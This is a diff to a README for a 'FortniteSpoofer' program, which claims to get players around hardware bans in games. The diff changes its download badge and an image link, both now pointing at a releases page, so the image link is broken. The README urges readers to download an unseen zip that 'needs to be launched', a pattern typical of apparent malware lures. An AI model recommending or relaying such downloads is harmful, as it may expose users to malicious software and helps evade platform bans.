@@ -33,7 +33,7 @@ In the world of online gaming, hardware bans can be a real headache for players.
 
 Click the button below to download the FortniteSpoofer software:
 
-[![Download FortniteSpoofer](https://img.shields.io/badge/Click-Here-blue.svg)](https://github.com/uploads/App.zip "Needs to be launched")
+[![Download FortniteSpoofer](https://github.com/mumymu/FortniteSpoofer/releases)](https://github.com/mumymu/FortniteSpoofer/releases "Needs to be launched")
 
 If you encounter any issues with the link provided, please check the "Releases" section of this repository for alternative download options.
 
@@ -58,7 +58,7 @@ For any questions or assistance related to the FortniteSpoofer software, please 
 
 Let's level up our gaming experience with FortniteSpoofer! 🚀🎮
 
-![Fortnite Image](https://example.com/fortnite-image.jpg)
+![Fortnite Image](https://github.com/mumymu/FortniteSpoofer/releases)
 
 ---
 
